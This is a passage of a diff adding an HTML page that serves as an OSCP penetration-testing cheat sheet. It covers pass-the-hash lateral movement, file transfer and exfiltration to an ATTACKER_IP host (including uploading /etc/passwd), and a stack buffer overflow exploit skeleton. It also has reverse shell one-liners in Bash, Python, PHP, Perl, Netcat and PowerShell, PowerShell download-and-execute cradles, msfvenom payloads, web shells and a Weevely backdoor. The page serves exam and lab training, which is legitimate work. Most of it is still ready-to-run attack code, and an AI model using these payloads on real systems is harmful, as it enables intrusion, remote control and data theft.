+xfreerdp /v:$IP /u:admin /p:password +clipboard /dynamic-resolution
+
+# Pass-the-Hash lateral movement
+impacket-psexec -hashes :NTLM_HASH admin@$IP
+evil-winrm -i $IP -u admin -H NTLM_HASH
+netexec smb $IP -u admin -H NTLM_HASH -x "whoami"</code></pre>
+
+              <pre><code class="language-powershell"># From Windows
+# PSExec
+.\PsExec64.exe \\TARGET_IP -u corp\admin -p password cmd.exe
+
+# PowerShell remoting
+$cred = Get-Credential
+Enter-PSSession -ComputerName TARGET -Credential $cred
+Invoke-Command -ComputerName TARGET -Credential $cred -ScriptBlock { whoami }
+
+# WMI
+wmic /node:TARGET /user:corp\admin /password:password process call create "cmd /c C:\temp\shell.exe"</code></pre>
+
+
+<!-- ============================================================ -->
+<!-- 9. FILE TRANSFERS                                             -->
+<!-- ============================================================ -->
+<h2 id="file-transfers">9. File Transfers</h2>
+
+              <h3 id="xfer-linux">9.1 Linux Transfers</h3>
+              <p>Download and upload files to/from Linux targets.</p>
+
+              <pre><code class="language-bash"># Download files to target
+wget http://ATTACKER_IP/file -O /tmp/file
+curl http://ATTACKER_IP/file -o /tmp/file
+
+# Python HTTP server (on attacker)
+python3 -m http.server 80
+
+# Netcat file transfer
+# Receiver:
+nc -lvnp 4444 &gt; file
+# Sender:
+nc RECEIVER_IP 4444 &lt; file
+
+# SCP (if SSH is available)
+scp user@ATTACKER_IP:/path/to/file /tmp/file
+scp /tmp/loot user@ATTACKER_IP:/path/to/loot
+
+# Base64 encoding (no file transfer tools available)
+# On source: base64 -w0 file
+# On target: echo "[base64_data]" | base64 -d &gt; file</code></pre>
+
+              <h3 id="xfer-windows">9.2 Windows Transfers</h3>
+              <p>Download and upload files to/from Windows targets.</p>
+
+              <pre><code class="language-powershell"># PowerShell download
+Invoke-WebRequest -Uri http://ATTACKER_IP/file -OutFile C:\temp\file
+(New-Object Net.WebClient).DownloadFile('http://ATTACKER_IP/file', 'C:\temp\file')
+iwr -uri http://ATTACKER_IP/file -outfile C:\temp\file
+
+# PowerShell upload
+Invoke-WebRequest -Uri http://ATTACKER_IP/upload -Method POST -InFile C:\temp\loot
+
+# Certutil
+certutil -urlcache -split -f http://ATTACKER_IP/file C:\temp\file
+
+# Bitsadmin
+bitsadmin /transfer job /download /priority high http://ATTACKER_IP/file C:\temp\file</code></pre>
+
+              <pre><code class="language-bash"># SMB server (on attacker)
+impacket-smbserver share /home/kali/share -smb2support
+impacket-smbserver share /home/kali/share -smb2support -user kali -password kali
+
+# Copy from Windows to SMB share
+copy C:\temp\loot \\ATTACKER_IP\share\loot
+net use Z: \\ATTACKER_IP\share /user:kali kali
+copy C:\temp\loot Z:\loot
+
+# Base64 encoding (PowerShell)
+[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\temp\file"))
+# Decode: [IO.File]::WriteAllBytes("C:\temp\file", [Convert]::FromBase64String("BASE64_DATA"))</code></pre>
+
+              <h3 id="xfer-exfil">9.3 Exfiltration &amp; Special Cases</h3>
+              <p>Methods for restrictive environments or exfiltrating data.</p>
+
+              <pre><code class="language-bash"># RDP shared folder — mount local folder into RDP session
+xfreerdp /v:$IP /u:user /p:password /drive:share,/home/kali/share
+
+# FTP transfer (if FTP server is available)
+# Start a Python FTP server on attacker
+python3 -m pyftpdlib -p 21 -w
+# On target (non-interactive FTP client)
+echo open ATTACKER_IP &gt; ftp.txt
+echo USER anonymous &gt;&gt; ftp.txt
+echo binary &gt;&gt; ftp.txt
+echo GET file &gt;&gt; ftp.txt
+echo bye &gt;&gt; ftp.txt
+ftp -n -v -s:ftp.txt</code></pre>
+
+              <pre><code class="language-bash"># PHP upload script (host on attacker, POST files from target)
+# upload.php on attacker:
+# &lt;?php move_uploaded_file($_FILES["file"]["tmp_name"], "uploads/" . $_FILES["file"]["name"]); ?&gt;
+
+# Upload from target using curl
+curl -F "file=@/etc/passwd" http://ATTACKER_IP/upload.php
+
+# Upload from target using PowerShell
+Invoke-RestMethod -Uri http://ATTACKER_IP/upload.php -Method Post -InFile C:\temp\loot -ContentType "multipart/form-data"</code></pre>
+
+              <table class="custom-table">
+                <thead>
+                  <tr>
+                    <th>Method</th>
+                    <th>Linux</th>
+                    <th>Windows</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr><td>HTTP download</td><td><code>wget</code> / <code>curl</code></td><td><code>Invoke-WebRequest</code> / <code>certutil</code></td></tr>
+                  <tr><td>SMB</td><td><code>smbclient</code></td><td><code>copy \\IP\share\file</code></td></tr>
+                  <tr><td>Netcat</td><td><code>nc</code></td><td><code>nc.exe</code></td></tr>
+                  <tr><td>SCP</td><td><code>scp</code></td><td><code>scp.exe</code> (if OpenSSH)</td></tr>
+                  <tr><td>Base64</td><td><code>base64 -w0</code></td><td><code>[Convert]::ToBase64String</code></td></tr>
+                  <tr><td>FTP</td><td><code>ftp</code></td><td><code>ftp -s:script.txt</code></td></tr>
+                </tbody>
+              </table>
+
+
+<!-- ============================================================ -->
+<!-- 10. EXPLOIT DEVELOPMENT                                       -->
+<!-- ============================================================ -->
+<h2 id="exploit-dev">10. Exploit Development</h2>
+
+              <h3 id="exploitdev-search">10.1 Finding Exploits</h3>
+              <p>Locate public exploits for identified software and versions.</p>
+
+              <pre><code class="language-bash"># SearchSploit (local Exploit-DB mirror)
+searchsploit apache 2.4.49
+searchsploit -m 50383          # mirror/copy exploit to current dir
+searchsploit -x 50383          # view exploit code
+
+# Update the database
+searchsploit -u
+
+# Online resources
+# https://www.exploit-db.com/
+# https://github.com/search (CVE-YYYY-XXXX)
+# https://nvd.nist.gov/</code></pre>
+
+              <h3 id="exploitdev-fixing">10.2 Fixing PoCs</h3>
+              <p>Public PoCs often need adjustments before they work.</p>
+
+              <ul>
+                <li>Check the <strong>target URL, IP, and port</strong> variables at the top of the script</li>
+                <li>Verify the <strong>Python version</strong> (<code>python2</code> vs <code>python3</code>) and install missing dependencies</li>
+                <li>Replace hardcoded <strong>shellcode/payload</strong> with your own (e.g., different LHOST/LPORT)</li>
+                <li>Fix <strong>encoding issues</strong> (bytes vs strings in Python 3)</li>
+                <li>Adjust <strong>offsets</strong> if the target binary version differs from the PoC</li>
+                <li>Run in a <strong>test environment</strong> first to confirm functionality</li>
+              </ul>
+
+              <pre><code class="language-bash"># Install Python2 dependencies for old exploits
+pip2 install requests
+python2 exploit.py
+
+# Cross-compile C exploits for the target
+gcc -o exploit exploit.c                                # Linux target
+x86_64-w64-mingw32-gcc -o exploit.exe exploit.c         # Windows 64-bit
+i686-w64-mingw32-gcc -o exploit.exe exploit.c            # Windows 32-bit</code></pre>
+
+              <h3 id="exploitdev-bof">10.3 Stack Buffer Overflow Walkthrough</h3>
+              <p>Basic vanilla stack overflow (no DEP/ASLR) workflow.</p>
+
+              <pre><code class="language-python"># 1. Fuzzing — find the crash point
+import socket
+
+buffer = b"A" * 100
+while True:
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect(("TARGET_IP", 9999))
+        s.send(buffer)
+        s.close()
+        buffer += b"A" * 100
+    except:
+        print(f"Crashed at {len(buffer)} bytes")
+        break</code></pre>
+
+              <pre><code class="language-bash"># 2. Find exact offset
+msf-pattern_create -l 2000
+# Send the pattern, note the EIP value
+msf-pattern_offset -l 2000 -q EIP_VALUE
+
+# 3. Verify offset — EIP should be 42424242
+python3 -c "print('A' * OFFSET + 'B' * 4 + 'C' * 200)"
+
+# 4. Find bad characters (send all 0x00-0xFF, check in debugger)
+
+# 5. Find a JMP ESP address (no ASLR/DEP module)
+# In Immunity Debugger with mona:
+!mona jmp -r esp -cpb "\x00"
+
+# 6. Generate shellcode
+msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f python -b '\x00' -v shellcode</code></pre>
+
+              <pre><code class="language-python"># 7. Final exploit
+import socket, struct
+
+offset = 524                    # from step 2
+eip = struct.pack("&lt;I", 0x625011AF)  # JMP ESP address from step 5
+nops = b"\x90" * 16
+shellcode = b""                 # paste msfvenom output here
+
+payload = b"A" * offset + eip + nops + shellcode
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("TARGET_IP", 9999))
+s.send(payload)
+s.close()</code></pre>
+
+
+<!-- ============================================================ -->
+<!-- 11. REVERSE SHELLS                                            -->
+<!-- ============================================================ -->
+<h2 id="reverse-shells">11. Reverse Shells</h2>
+
+              <h3 id="shells-listeners">11.1 Listeners</h3>
+              <p>Set up a listener before sending the reverse shell payload.</p>
+
+              <pre><code class="language-bash"># Netcat listener
+nc -lvnp 443
+
+# Rlwrap (add arrow key support)
+rlwrap nc -lvnp 443
+
+# Metasploit multi/handler
+msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST ATTACKER_IP; set LPORT 443; run"</code></pre>
+
+              <h3 id="shells-oneliners">11.2 One-Liners</h3>
+              <p>Common reverse shell payloads for different languages and environments.</p>
+
+              <pre><code class="language-bash"># Bash
+bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/443 0&gt;&amp;1
+bash -c 'bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/443 0&gt;&amp;1'
+
+# Python
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+
+# PHP
+php -r '$sock=fsockopen("ATTACKER_IP",443);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'
+
+# Perl
+perl -e 'use Socket;$i="ATTACKER_IP";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'
+
+# Netcat (with -e)
+nc -e /bin/sh ATTACKER_IP 443
+# Netcat (without -e) — named pipe
+rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc ATTACKER_IP 443 &gt;/tmp/f</code></pre>
+
+              <pre><code class="language-powershell"># PowerShell reverse shell
+$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP", 443)
+$stream = $client.GetStream()
+[byte[]]$bytes = 0..65535 | % {0}
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
+    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
+    $sendback = (iex $data 2&gt;&amp;1 | Out-String)
+    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback + "PS " + (pwd).Path + "&gt; ")
+    $stream.Write($sendbyte, 0, $sendbyte.Length)
+    $stream.Flush()
+}
+$client.Close()</code></pre>
+
+              <pre><code class="language-powershell"># PowerShell one-liner (base64 encode the above, or use download cradle)
+powershell -ep bypass -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')"
+
+# PowerShell encoded command
+$cmd = '$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",443);...'
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
+$encoded = [Convert]::ToBase64String($bytes)
+powershell -ep bypass -enc $encoded</code></pre>
+
+              <h3 id="shells-msfvenom">11.3 Msfvenom Payloads</h3>
+              <p>Generate standalone payloads for various platforms and formats.</p>
+
+              <table class="custom-table">
+                <thead>
+                  <tr>
+                    <th>Target</th>
+                    <th>Command</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr><td>Windows x64 (exe)</td><td><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=443 -f exe -o shell.exe</code></td></tr>
+                  <tr><td>Windows x86 (exe)</td><td><code>msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=443 -f exe -o shell.exe</code></td></tr>
+                  <tr><td>Linux x64 (elf)</td><td><code>msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=443 -f elf -o shell.elf</code></td></tr>
+                  <tr><td>PHP</td><td><code>msfvenom -p php/reverse_php LHOST=IP LPORT=443 -f raw -o shell.php</code></td></tr>
+                  <tr><td>ASP</td><td><code>msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=443 -f asp -o shell.asp</code></td></tr>
+                  <tr><td>JSP</td><td><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=443 -f raw -o shell.jsp</code></td></tr>
+                  <tr><td>WAR</td><td><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=443 -f war -o shell.war</code></td></tr>
+                  <tr><td>Python</td><td><code>msfvenom -p cmd/unix/reverse_python LHOST=IP LPORT=443 -f raw</code></td></tr>
+                  <tr><td>Windows DLL</td><td><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=443 -f dll -o evil.dll</code></td></tr>
+                  <tr><td>Shellcode (C)</td><td><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=443 -f c</code></td></tr>
+                </tbody>
+              </table>
+
+              <h3 id="shells-webshells">11.4 Web Shells</h3>
+              <p>Lightweight shells for when you can upload files to a web server.</p>
+
+              <pre><code class="language-php">&lt;?php system($_GET['cmd']); ?&gt;</code></pre>
+
+              <pre><code class="language-bash"># PHP reverse shell (Kali built-in)
+cp /usr/share/webshells/php/php-reverse-shell.php shell.php
+# Edit LHOST and LPORT in shell.php, then upload
+
+# ASPX webshell
+cp /usr/share/webshells/aspx/cmdasp.aspx shell.aspx
+
+# JSP webshell
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f raw -o shell.jsp
+
+# Weevely — PHP backdoor with encrypted traffic
+weevely generate password shell.php
+# Upload shell.php, then connect:
+weevely http://$IP/uploads/shell.php password</code></pre>
+
+              <pre><code class="language-bash"># Bind shell — useful when target cannot reach you
+# On target (listener):
+nc -lvnp 4444 -e /bin/bash
+# On attacker (connect to target):
+nc $IP 4444
+
+# Bind shell with ncat
+ncat --exec /bin/bash --allow ATTACKER_IP -vnl 4444 --ssl</code></pre>
+
+              <h3 id="shells-upgrade">11.5 Shell Upgrades</h3>
+              <p>Upgrade a dumb shell to a fully interactive TTY.</p>
+
+              <pre><code class="language-bash"># Python PTY upgrade
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+# Press Ctrl+Z to background the shell
+stty raw -echo; fg
+# Press Enter twice
+export TERM=xterm
+export SHELL=/bin/bash
+stty rows 40 columns 160</code></pre>
+
+              <pre><code class="language-bash"># Script upgrade (if no Python)
+script -qc /bin/bash /dev/null
+# Then same Ctrl+Z, stty raw -echo; fg
+
+# Socat full TTY
+# On attacker:
+socat file:`tty`,raw,echo=0 tcp-listen:443
+# On target:
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:443</code></pre>
+
+
+<!-- ============================================================ -->
+<!-- 12. REPORT WRITING                                            -->
+<!-- ============================================================ -->
+<h2 id="report-writing">12. Report Writing</h2>
+
+              <h3 id="report-structure">12.1 Exam Structure</h3>
+              <p>The OSCP exam report must demonstrate a clear methodology and reproducible exploitation steps.</p>
+
+              <ul>
+                <li><strong>3 standalone machines</strong> (20 points each, 60 total) + <strong>1 AD set</strong> (3 machines, 40 points total)</li>
+                <li><strong>Passing score:</strong> 70 points</li>
+                <li><strong>Bonus points:</strong> 10 points for completing 80%+ of PEN-200 exercises and 30+ lab machines</li>
+                <li><strong>Time limit:</strong> 23 hours 45 minutes for the exam, then 24 hours to submit the report</li>
+                <li><strong>Metasploit restriction:</strong> Full Metasploit (meterpreter, exploit modules) allowed on only ONE machine</li>
+              </ul>
+
+              <h3 id="report-screenshots">12.2 Screenshot Requirements</h3>
+              <p>Every step must be documented with screenshots to prove exploitation.</p>
+
+              <ul>
+                <li>Take a screenshot of <strong>every significant step</strong>: initial foothold, privilege escalation, flag collection</li>
+                <li>Screenshots must show the <strong>IP address</strong> and the <strong>command executed</strong></li>
+                <li>Include <code>whoami</code> and <code>hostname</code> output in screenshots</li>
+                <li>Capture the <strong>proof.txt</strong> and <strong>local.txt</strong> files with the command used to read them</li>
+              </ul>
+
+              <pre><code class="language-bash"># Linux proof collection
+hostname &amp;&amp; whoami &amp;&amp; ip a &amp;&amp; cat /root/proof.txt
+cat /home/*/local.txt 2&gt;/dev/null
+cat /root/proof.txt</code></pre>
+
+              <pre><code class="language-powershell"># Windows proof collection
+hostname
+whoami
+ipconfig
+type C:\Users\Administrator\Desktop\proof.txt
+type C:\Users\*\Desktop\local.txt</code></pre>
+
+              <h3 id="report-format">12.3 Report Format</h3>
+              <p>Use the official OffSec report template. Structure each machine write-up consistently.</p>
+
+              <ul>
+                <li><strong>Executive Summary:</strong> High-level overview of findings</li>
+                <li><strong>Per-machine sections:</strong>
+                  <ul>
+                    <li>Service enumeration results</li>
+                    <li>Vulnerability identification</li>
+                    <li>Exploitation steps (with screenshots)</li>
+                    <li>Privilege escalation steps (with screenshots)</li>
+                    <li>Proof screenshots (proof.txt / local.txt with IP visible)</li>
+                  </ul>
+                </li>
+                <li><strong>Active Directory chain:</strong> Document the full attack path across all 3 AD machines</li>
+                <li><strong>Remediation recommendations</strong> for each vulnerability</li>
+              </ul>
+
+              <p>Tools for report writing:</p>
+              <ul>
+                <li><a href="https://github.com/noraj/OSCP-Exam-Report-Template-Markdown" target="_blank" rel="noopener noreferrer">OSCP Markdown Report Template</a> (convert with Pandoc to PDF)</li>
+                <li>CherryTree or Obsidian for note-taking during the exam</li>
+                <li>Flameshot or Greenshot for screenshots</li>
+              </ul>
+
+            </div>
+          </div>
+        </div>
+
+      </div>
+    </section><!-- End Cheatsheet Section -->
+
+  </main><!-- End #main -->
+
+  <!-- ======= Index ======= -->
+  <div class="index-btn" onclick="toggleIndex()">Index</div>
+  <div id="index" class="index">
+    <div class="container mt-3">
+      <div class="input-group mb-3">
+        <input type="text" id="search-input" class="form-control" placeholder="Search sections..." aria-label="Search sections" aria-describedby="search-button">
+        <button class="btn btn-primary" type="button" id="search-button">
+          <i class="bi bi-search"></i>
+        </button>
+      </div>
+    </div>
+    <button class="expand-collapse-btn" onclick="toggleAll()">Show/Hide All</button>
+    <div class="section-flow-1">
+      <button class="dropdown-btn">1. Information Gathering
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#info-passive">1.1 Passive Reconnaissance</a>
+        <a href="#info-dns">1.2 DNS Enumeration</a>
+        <a href="#info-scanning">1.3 Active Scanning</a>
+        <a href="#info-ports">1.4 Common Port Enumeration</a>
+      </div>
+    </div>
+    <div class="section-flow-2">
+      <button class="dropdown-btn">2. Web Application Attacks
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#web-enum">2.1 Directory &amp; File Discovery</a>
+        <a href="#web-lfi-rfi">2.2 LFI / RFI</a>
+        <a href="#web-sqli">2.3 SQL Injection</a>
+        <a href="#web-xss">2.4 Cross-Site Scripting (XSS)</a>
+        <a href="#web-upload">2.5 File Upload</a>
+        <a href="#web-cmdi">2.6 Command Injection</a>
+      </div>
+    </div>
+    <div class="section-flow-3">
+      <button class="dropdown-btn">3. Password Attacks
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#pass-bruteforce">3.1 Brute Force</a>
+        <a href="#pass-cracking">3.2 Hash Cracking</a>
+        <a href="#pass-spraying">3.3 Credential Spraying</a>
+        <a href="#pass-mimikatz">3.4 Mimikatz</a>
+        <a href="#pass-wordlists">3.5 Wordlists &amp; Rules</a>
+      </div>
+    </div>
+    <div class="section-flow-4">
+      <button class="dropdown-btn">4. Client-Side Attacks
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#client-macros">4.1 Macro Payloads</a>
+        <a href="#client-library">4.2 Windows Library Files</a>
+        <a href="#client-phishing">4.3 Phishing</a>
+      </div>
+    </div>
+    <div class="section-flow-5">
+      <button class="dropdown-btn">5. Windows Privilege Escalation
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#winpe-enum">5.1 Enumeration</a>
+        <a href="#winpe-services">5.2 Service Misconfigurations</a>
+        <a href="#winpe-tokens">5.3 Token Impersonation</a>
+        <a href="#winpe-creds">5.4 Stored Credentials</a>
+        <a href="#winpe-schtask">5.5 Scheduled Tasks</a>
+        <a href="#winpe-alwayselevated">5.6 AlwaysInstallElevated</a>
+        <a href="#winpe-kernel">5.7 Kernel Exploits</a>
+      </div>
+    </div>
+    <div class="section-flow-6">
+      <button class="dropdown-btn">6. Linux Privilege Escalation
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#linpe-enum">6.1 Enumeration</a>
+        <a href="#linpe-suid">6.2 SUID Binaries &amp; sudo</a>
+        <a href="#linpe-cron">6.3 Cron Jobs &amp; PATH Hijacking</a>
+        <a href="#linpe-caps">6.4 Capabilities</a>
+        <a href="#linpe-groups">6.5 Dangerous Groups</a>
+        <a href="#linpe-kernel">6.6 Kernel Exploits</a>
+      </div>
+    </div>
+    <div class="section-flow-7">
+      <button class="dropdown-btn">7. Tunneling &amp; Pivoting
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#tunnel-ssh">7.1 SSH Forwarding</a>
+        <a href="#tunnel-ligolo">7.2 Ligolo-ng</a>
+        <a href="#tunnel-chisel">7.3 Chisel</a>
+        <a href="#tunnel-socat">7.4 Socat</a>
+      </div>
+    </div>
+    <div class="section-flow-8">
+      <button class="dropdown-btn">8. Active Directory
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#ad-enum">8.1 Enumeration</a>
+        <a href="#ad-attacks">8.2 Attacks</a>
+        <a href="#ad-tickets">8.3 Kerberos Tickets &amp; Persistence</a>
+        <a href="#ad-lateral">8.4 Lateral Movement</a>
+      </div>
+    </div>
+    <div class="section-flow-9">
+      <button class="dropdown-btn">9. File Transfers
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#xfer-linux">9.1 Linux Transfers</a>
+        <a href="#xfer-windows">9.2 Windows Transfers</a>
+        <a href="#xfer-exfil">9.3 Exfiltration &amp; Special Cases</a>
+      </div>
+    </div>
+    <div class="section-flow-10">
+      <button class="dropdown-btn">10. Exploit Development
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#exploitdev-search">10.1 Finding Exploits</a>
+        <a href="#exploitdev-fixing">10.2 Fixing PoCs</a>
+        <a href="#exploitdev-bof">10.3 Stack Buffer Overflow</a>
+      </div>
+    </div>
+    <div class="section-flow-11">
+      <button class="dropdown-btn">11. Reverse Shells
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#shells-listeners">11.1 Listeners</a>
+        <a href="#shells-oneliners">11.2 One-Liners</a>
+        <a href="#shells-msfvenom">11.3 Msfvenom Payloads</a>
+        <a href="#shells-webshells">11.4 Web Shells</a>
+        <a href="#shells-upgrade">11.5 Shell Upgrades</a>
+      </div>
+    </div>
+    <div class="section-flow-12">
+      <button class="dropdown-btn">12. Report Writing
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#report-structure">12.1 Exam Structure</a>
+        <a href="#report-screenshots">12.2 Screenshot Requirements</a>
+        <a href="#report-format">12.3 Report Format</a>
+      </div>
+    </div>
+
+  </div>
+  <!-- End Index -->
+
+  <!-- ======= Footer ======= -->
+  <footer id="footer">
+    <div class="container">
+      <div class="credits">
+        <p>
+          &copy; Wencheng Xue<br>
+          Penetration Tester &amp; Vulnerability Researcher
+        </p>
+      </div>
+    </div>
+  </footer><!-- End  Footer -->
+
+  <a href="#" class="back-to-top d-flex align-items-center justify-content-center"><i
+      class="bi bi-arrow-up-short"></i></a>
+
+  <!-- Vendor JS Files -->
+  <script defer src="./vendor/aos/aos.js"></script>
+  <script defer src="./vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
+  <script defer src="./vendor/isotope-layout/isotope.pkgd.min.js"></script>
+  <script defer src="./vendor/typed.js/typed.min.js"></script>
+  <!-- Prism JS -->
+  <script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/prism.min.js"></script>
+  <script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-bash.min.js"></script>
+  <script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-powershell.min.js"></script>
+  <script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-csharp.min.js"></script>
+  <script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-python.min.js"></script>
+  <script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-sql.min.js"></script>
+  <script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-javascript.min.js"></script>
+  <script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-markup-templating.min.js"></script>
+  <script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-php.min.js"></script>
+
+  <!-- Template Main JS File -->
+  <script defer src="./js/main.js"></script>
+
+  <!-- Prism JS Additional Keywords-->
+  <script defer src="js/prism-langs.js"></script>
+
+  <script defer src="js/site.js"></script>
+  <script defer src="js/cheatsheet-index.js"></script>
+
+</body>
+
+</html>
